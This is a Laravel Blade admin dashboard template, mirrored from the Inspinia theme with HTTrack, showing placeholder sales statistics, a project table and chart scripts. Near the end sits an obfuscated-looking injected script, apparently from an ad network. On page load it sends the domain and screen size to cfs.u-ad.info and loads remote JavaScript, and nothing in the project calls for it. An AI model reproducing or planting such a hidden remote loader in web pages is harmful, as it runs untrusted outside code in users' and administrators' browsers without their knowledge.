<!DOCTYPE html>
<html>


<!-- Mirrored from webapplayers.com/inspinia_admin-v2.3/dashboard_5.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 16 Nov 2015 17:24:13 GMT -->
<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Dashboard</title>

    <link href="{{asset('css/bootstrap.min.css')}}" rel="stylesheet">
    <link href="{{asset('font-awesome/css/font-awesome.css')}}" rel="stylesheet">

    <link href="{{asset('css/animate.css')}}" rel="stylesheet">
    <link href="{{asset('css/style.css')}}" rel="stylesheet">

</head>

<body>
<div id="wrapper">
    <nav class="navbar-default navbar-static-side" role="navigation">
        <div class="sidebar-collapse">
            <ul class="nav metismenu" id="side-menu">
                <li class="nav-header">
                    <div class="dropdown profile-element">
                        <span>
                            <img alt="image" class="img-circle" src="{{asset('img/profile_small.jpg')}}" />
                        </span>
                        <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                            <span class="clear">
                                <span class="block m-t-xs">
                                    <strong class="font-bold">{{auth('admin')->user()->name}}</strong>
                                </span>
                                <span class="text-muted text-xs block">{{\App\Libs\Bo::role_name(session('role_id'))}} <b class="caret"></b></span>
                            </span>
                        </a>
                        <ul class="dropdown-menu animated fadeInRight m-t-xs">
                            <li><a href="profile.html">Profile</a></li>
                            <li><a href="contacts.html">Contacts</a></li>
                            <li><a href="mailbox.html">Mailbox</a></li>
                            <li class="divider"></li>
                            <li><a href="login.html">Logout</a></li>
                        </ul>
                    </div>
                    <div class="logo-element">
                        IN+
                    </div>
                </li>
                <?php echo \App\Libs\Bo::menu();?>
            </ul>

        </div>
    </nav>

    <div id="page-wrapper" class="gray-bg">
        <div class="row border-bottom">
            <nav class="navbar navbar-static-top white-bg" role="navigation" style="margin-bottom: 0">
                <div class="navbar-header">
                    <a class="navbar-minimalize minimalize-styl-2 btn btn-primary " href="#"><i class="fa fa-bars"></i> </a>
                    <form role="search" class="navbar-form-custom" action="http://webapplayers.com/inspinia_admin-v2.3/search_results.html">
                        <div class="form-group">
                            <input type="text" placeholder="Search for something..." class="form-control" name="top-search" id="top-search">
                        </div>
                    </form>
                </div>
                <ul class="nav navbar-top-links navbar-right">
                    <li>
                        <span class="m-r-sm text-muted welcome-message">Selamat datang {{ucfirst(auth('admin')->user()->name)}}</span>
                    </li>

                    <li>
                        <a href="{{route('bo.logout')}}">
                            <i class="fa fa-sign-out"></i> Log out
                        </a>
                    </li>
                </ul>

            </nav>
        </div>
        <div class="row wrapper border-bottom white-bg page-heading">
            <div class="col-lg-10">
                <h2>Text Diff</h2>
                <ol class="breadcrumb">
                    <li>
                        <a href="index-2.html">Home</a>
                    </li>
                    <li>
                        <a>Miscellaneous</a>
                    </li>
                    <li class="active">
                        <strong>Diff</strong>
                    </li>
                </ol>
            </div>
            <div class="col-lg-2">

            </div>
        </div>
        <div class="wrapper wrapper-content animated fadeIn">

            <div class="p-w-md m-t-sm">
                <div class="row">

                    <div class="col-sm-4">
                        <h1 class="m-b-xs">
                            26,900
                        </h1>
                        <small>
                            Sales in current month
                        </small>
                        <div id="sparkline1" class="m-b-sm"></div>
                        <div class="row">
                            <div class="col-xs-4">
                                <small class="stats-label">Pages / Visit</small>
                                <h4>236 321.80</h4>
                            </div>

                            <div class="col-xs-4">
                                <small class="stats-label">% New Visits</small>
                                <h4>46.11%</h4>
                            </div>
                            <div class="col-xs-4">
                                <small class="stats-label">Last week</small>
                                <h4>432.021</h4>
                            </div>
                        </div>

                    </div>
                    <div class="col-sm-4">
                        <h1 class="m-b-xs">
                            98,100
                        </h1>
                        <small>
                            Sales in last 24h
                        </small>
                        <div id="sparkline2" class="m-b-sm"></div>
                        <div class="row">
                            <div class="col-xs-4">
                                <small class="stats-label">Pages / Visit</small>
                                <h4>166 781.80</h4>
                            </div>

                            <div class="col-xs-4">
                                <small class="stats-label">% New Visits</small>
                                <h4>22.45%</h4>
                            </div>
                            <div class="col-xs-4">
                                <small class="stats-label">Last week</small>
                                <h4>862.044</h4>
                            </div>
                        </div>


                    </div>
                    <div class="col-sm-4">

                        <div class="row m-t-xs">
                            <div class="col-xs-6">
                                <h5 class="m-b-xs">Income last month</h5>
                                <h1 class="no-margins">160,000</h1>
                                <div class="font-bold text-navy">98% <i class="fa fa-bolt"></i></div>
                            </div>
                            <div class="col-xs-6">
                                <h5 class="m-b-xs">Sals current year</h5>
                                <h1 class="no-margins">42,120</h1>
                                <div class="font-bold text-navy">98% <i class="fa fa-bolt"></i></div>
                            </div>
                        </div>


                        <table class="table small m-t-sm">
                            <tbody>
                            <tr>
                                <td>
                                    <strong>142</strong> Projects

                                </td>
                                <td>
                                    <strong>22</strong> Messages
                                </td>

                            </tr>
                            <tr>
                                <td>
                                    <strong>61</strong> Comments
                                </td>
                                <td>
                                    <strong>54</strong> Articles
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <strong>154</strong> Companies
                                </td>
                                <td>
                                    <strong>32</strong> Clients
                                </td>
                            </tr>
                            </tbody>
                        </table>



                    </div>

                </div>

                <div class="row">
                    <div class="col-lg-12">
                        <div class="small pull-left col-md-3 m-l-lg m-t-md">
                            <strong>Sales char</strong> have evolved over the years sometimes.
                        </div>
                        <div class="small pull-right col-md-3 m-t-md text-right">
                            <strong>There are many</strong> variations of passages of Lorem Ipsum available, but the majority have suffered.
                        </div>
                        <div class="flot-chart m-b-xl">
                            <div class="flot-chart-content" id="flot-dashboard5-chart"></div>
                        </div>
                    </div>
                </div>


                <div class="row">
                    <div class="col-lg-12">
                        <div class="ibox">



                            <div class="ibox-content">

                                <div class="row">
                                    <div class="col-sm-4">
                                        <div class="form-group">
                                            <label class="control-label" for="product_name">Project Name</label>
                                            <input type="text" id="product_name" name="product_name" value="" placeholder="Project Name" class="form-control">
                                        </div>
                                    </div>
                                    <div class="col-sm-2">
                                        <div class="form-group">
                                            <label class="control-label" for="price">Name</label>
                                            <input type="text" id="price" name="price" value="" placeholder="Name" class="form-control">
                                        </div>
                                    </div>
                                    <div class="col-sm-2">
                                        <div class="form-group">
                                            <label class="control-label" for="quantity">Company</label>
                                            <input type="text" id="quantity" name="quantity" value="" placeholder="Company" class="form-control">
                                        </div>
                                    </div>
                                    <div class="col-sm-4">
                                        <div class="form-group">
                                            <label class="control-label" for="status">Status</label>
                                            <select name="status" id="status" class="form-control">
                                                <option value="1" selected="">Completed</option>
                                                <option value="0">Pending</option>
                                            </select>
                                        </div>
                                    </div>
                                </div>

                                <div class="table-responsive">
                                    <table class="table table-striped">

                                        <tbody>
                                        <tr>
                                            <td>1</td>
                                            <td>Master project</td>
                                            <td>Patrick Smith</td>
                                            <td>$892,074</td>
                                            <td>Inceptos Hymenaeos Ltd</td>
                                            <td><strong>20%</strong></td>
                                            <td>Jul 14, 2015</td>
                                            <td><a href="#"><i class="fa fa-check text-navy"></i></a></td>
                                        </tr>
                                        <tr>
                                            <td>2</td>
                                            <td>Alpha project</td>
                                            <td>Alice Jackson</td>
                                            <td>$963,486</td>
                                            <td>Nec Euismod In Company</td>
                                            <td><strong>40%</strong></td>
                                            <td>Jul 16, 2015</td>
                                            <td><a href="#"><i class="fa fa-check text-navy"></i></a></td>
                                        </tr>
                                        <tr>
                                            <td>3</td>
                                            <td>Betha project</td>
                                            <td>John Smith</td>
                                            <td>$996,824</td>
                                            <td>Erat Volutpat</td>
                                            <td><strong>75%</strong></td>
                                            <td>Jul 18, 2015</td>
                                            <td><a href="#"><i class="fa fa-check text-navy"></i></a></td>
                                        </tr>
                                        <tr>
                                            <td>4</td>
                                            <td>Gamma project</td>
                                            <td>Anna Jordan</td>
                                            <td>$105,192</td>
                                            <td>Tellus Ltd</td>
                                            <td><strong>18%</strong></td>
                                            <td>Jul 22, 2015</td>
                                            <td><a href="#"><i class="fa fa-check text-navy"></i></a></td>
                                        </tr>
                                        <tr>
                                            <td>2</td>
                                            <td>Alpha project</td>
                                            <td>Alice Jackson</td>
                                            <td>$674,803</td>
                                            <td>Nec Euismod In Company</td>
                                            <td><strong>40%</strong></td>
                                            <td>Jul 16, 2015</td>
                                            <td><a href="#"><i class="fa fa-check text-navy"></i></a></td>
                                        </tr>
                                        <tr>
                                            <td>1</td>
                                            <td>Master project</td>
                                            <td>Patrick Smith</td>
                                            <td>$174,729</td>
                                            <td>Inceptos Hymenaeos Ltd</td>
                                            <td><strong>20%</strong></td>
                                            <td>Jul 14, 2015</td>
                                            <td><a href="#"><i class="fa fa-check text-navy"></i></a></td>
                                        </tr>
                                        <tr>
                                            <td>4</td>
                                            <td>Gamma project</td>
                                            <td>Anna Jordan</td>
                                            <td>$823,198</td>
                                            <td>Tellus Ltd</td>
                                            <td><strong>18%</strong></td>
                                            <td>Jul 22, 2015</td>
                                            <td><a href="#"><i class="fa fa-check text-navy"></i></a></td>
                                        </tr>
                                        <tr>
                                            <td>1</td>
                                            <td>Project <small>This is example of project</small></td>
                                            <td>Patrick Smith</td>
                                            <td>$778,696</td>
                                            <td>Inceptos Hymenaeos Ltd</td>
                                            <td><strong>20%</strong></td>
                                            <td>Jul 14, 2015</td>
                                            <td><a href="#"><i class="fa fa-check text-navy"></i></a></td>
                                        </tr>
                                        <tr>
                                            <td>2</td>
                                            <td>Alpha project</td>
                                            <td>Alice Jackson</td>
                                            <td>$861,063</td>
                                            <td>Nec Euismod In Company</td>
                                            <td><strong>40%</strong></td>
                                            <td>Jul 16, 2015</td>
                                            <td><a href="#"><i class="fa fa-check text-navy"></i></a></td>
                                        </tr>
                                        <tr>
                                            <td>3</td>
                                            <td>Betha project</td>
                                            <td>John Smith</td>
                                            <td>$109,125</td>
                                            <td>Erat Volutpat</td>
                                            <td><strong>75%</strong></td>
                                            <td>Jul 18, 2015</td>
                                            <td><a href="#"><i class="fa fa-check text-navy"></i></a></td>
                                        </tr>
                                        <tr>
                                            <td>4</td>
                                            <td>Gamma project</td>
                                            <td>Anna Jordan</td>
                                            <td>$600,978</td>
                                            <td>Tellus Ltd</td>
                                            <td><strong>18%</strong></td>
                                            <td>Jul 22, 2015</td>
                                            <td><a href="#"><i class="fa fa-check text-navy"></i></a></td>
                                        </tr>
                                        <tr>
                                            <td>2</td>
                                            <td>Alpha project</td>
                                            <td>Alice Jackson</td>
                                            <td>$150,161</td>
                                            <td>Nec Euismod In Company</td>
                                            <td><strong>40%</strong></td>
                                            <td>Jul 16, 2015</td>
                                            <td><a href="#"><i class="fa fa-check text-navy"></i></a></td>
                                        </tr>
                                        <tr>
                                            <td>1</td>
                                            <td>Project <small>This is example of project</small></td>
                                            <td>Patrick Smith</td>
                                            <td>$160,586</td>
                                            <td>Inceptos Hymenaeos Ltd</td>
                                            <td><strong>20%</strong></td>
                                            <td>Jul 14, 2015</td>
                                            <td><a href="#"><i class="fa fa-check text-navy"></i></a></td>
                                        </tr>
                                        <tr>
                                            <td>4</td>
                                            <td>Gamma project</td>
                                            <td>Anna Jordan</td>
                                            <td>$110,612</td>
                                            <td>Tellus Ltd</td>
                                            <td><strong>18%</strong></td>
                                            <td>Jul 22, 2015</td>
                                            <td><a href="#"><i class="fa fa-check text-navy"></i></a></td>
                                        </tr>
                                        </tbody>
                                    </table>
                                </div>

                            </div>
                        </div>
                    </div>
                </div>

            </div>


        </div>

        <div class="footer">
            <div class="pull-right">
                10GB of <strong>250GB</strong> Free.
            </div>
            <div>
                <strong>Copyright</strong> Example Company &copy; 2014-2015
            </div>
        </div>
    </div>

    </div>
</div>

<!-- Mainly scripts -->
<script src="{{asset('js/jquery-2.1.1.js')}}"></script>
<script src="{{asset('js/bootstrap.min.js')}}"></script>
<script src="{{asset('js/plugins/metisMenu/jquery.metisMenu.js')}}"></script>
<script src="{{asset('js/plugins/slimscroll/jquery.slimscroll.min.js')}}"></script>

<!-- Flot -->
<script src="{{asset('js/plugins/flot/jquery.flot.js')}}"></script>
<script src="{{asset('js/plugins/flot/jquery.flot.tooltip.min.js')}}"></script>
<script src="{{asset('js/plugins/flot/jquery.flot.spline.js')}}"></script>
<script src="{{asset('js/plugins/flot/jquery.flot.resize.js')}}"></script>
<script src="{{asset('js/plugins/flot/jquery.flot.pie.js')}}"></script>
<script src="{{asset('js/plugins/flot/jquery.flot.symbol.js')}}"></script>
<script src="{{asset('js/plugins/flot/jquery.flot.time.js')}}"></script>

<!-- Custom and plugin javascript -->
<script src="{{asset('js/inspinia.js')}}"></script>
<script src="{{asset('js/plugins/pace/pace.min.js')}}"></script>

<!-- Sparkline -->
<script src="{{asset('js/plugins/sparkline/jquery.sparkline.min.js')}}"></script>


<script>
    $(document).ready(function() {

        var sparklineCharts = function(){
            $("#sparkline1").sparkline([34, 43, 43, 35, 44, 32, 44, 52], {
                type: 'line',
                width: '100%',
                height: '50',
                lineColor: '#1ab394',
                fillColor: "transparent"
            });

            $("#sparkline2").sparkline([32, 11, 25, 37, 41, 32, 34, 42], {
                type: 'line',
                width: '100%',
                height: '50',
                lineColor: '#1ab394',
                fillColor: "transparent"
            });

            $("#sparkline3").sparkline([34, 22, 24, 41, 10, 18, 16,8], {
                type: 'line',
                width: '100%',
                height: '50',
                lineColor: '#1C84C6',
                fillColor: "transparent"
            });
        };

        var sparkResize;

        $(window).resize(function(e) {
            clearTimeout(sparkResize);
            sparkResize = setTimeout(sparklineCharts, 500);
        });

        sparklineCharts();




        var data1 = [
            [0,4],[1,8],[2,5],[3,10],[4,4],[5,16],[6,5],[7,11],[8,6],[9,11],[10,20],[11,10],[12,13],[13,4],[14,7],[15,8],[16,12]
        ];
        var data2 = [
            [0,0],[1,2],[2,7],[3,4],[4,11],[5,4],[6,2],[7,5],[8,11],[9,5],[10,4],[11,1],[12,5],[13,2],[14,5],[15,2],[16,0]
        ];
        $("#flot-dashboard5-chart").length && $.plot($("#flot-dashboard5-chart"), [
                    data1,  data2
                ],
                {
                    series: {
                        lines: {
                            show: false,
                            fill: true
                        },
                        splines: {
                            show: true,
                            tension: 0.4,
                            lineWidth: 1,
                            fill: 0.4
                        },
                        points: {
                            radius: 0,
                            show: true
                        },
                        shadowSize: 2
                    },
                    grid: {
                        hoverable: true,
                        clickable: true,

                        borderWidth: 2,
                        color: 'transparent'
                    },
                    colors: ["#1ab394", "#1C84C6"],
                    xaxis:{
                    },
                    yaxis: {
                    },
                    tooltip: false
                }
        );

    });
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bQVeRFnR5BCEfUy2cl73CjBJ9GOQsjrFfKHqMv7C47YChy6qT3zfDqI86nOm6weiZMQsuFsvttnpsXVgjpm5VToMA2h1%2f%2fYK06XatYzsuKbs7yiQX0E2iWhE303GekYuoxKwz7V707ORO%2b%2fSEYZz9MhMSAcS9BsALv7XncHmKi3JnMndc%2frEpXXuxDq2BMPJsirNAxrohTZJo2fAKJi8UXwY1rZegJkcK2qSmKi9NwiZhoyRMMwm%2fn5GUb8jPRKWE3u6z0k9ym5KZ959543Di0OoU%2fcFksczM0UYNgudOyc6iNpaTKUGwhTTT4%2fPk88BNdvhsiY084%2fRsnb5EQRBEKDA5%2fu0%2fz8atd11pJelk17Oa1WMpGJZLA3g5NYSAN2Kh5u8G1hvF5AUo03qElxnvbGTK0vv9dTw5G0pAZ%2b5sMmWnOVZiEMt%2bssrVr40Qb6SCRrbwnIYERJ8eZLGVWP28iSSzpJJgWLUGB0cmYiDAdd9s9nya7OYzGg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from webapplayers.com/inspinia_admin-v2.3/dashboard_5.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 16 Nov 2015 17:24:13 GMT -->
</html>
